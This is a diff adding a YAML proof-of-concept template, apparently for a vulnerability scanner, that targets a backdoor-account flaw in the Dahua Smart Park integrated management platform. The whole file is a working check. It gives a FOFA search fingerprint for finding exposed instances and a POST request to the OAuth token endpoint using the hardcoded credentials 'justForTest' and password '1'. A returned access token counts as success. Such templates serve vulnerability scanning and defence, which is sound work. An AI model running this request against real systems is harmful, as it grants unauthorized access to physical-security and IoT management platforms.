@@ -1,0 +1,29 @@
+id: poc-yaml-dahua-intelligent-iot-information-disclosure
+info:
+  name: 大华智慧园区 后门账户漏洞
+  severity: high
+  tags:
+  - 后门
+  finger: 大华智慧园区综合管理平台
+  fofa: icon_hash="-1935899595"body="*客户端会小于800*"
+requests:
+- method: POST
+  path: /evo-apigw/evo-oauth/oauth/token
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+  expression: 'status_code == 200 &&
+
+    contains(body,"success") &&
+
+    contains(body,"access_token") &&
+
+    contains(body,"token_type") &&
+
+    contains(body,"magicId") &&
+
+    contains(headers,"application/json")
+
+    '
+variables: {}
+transport: http
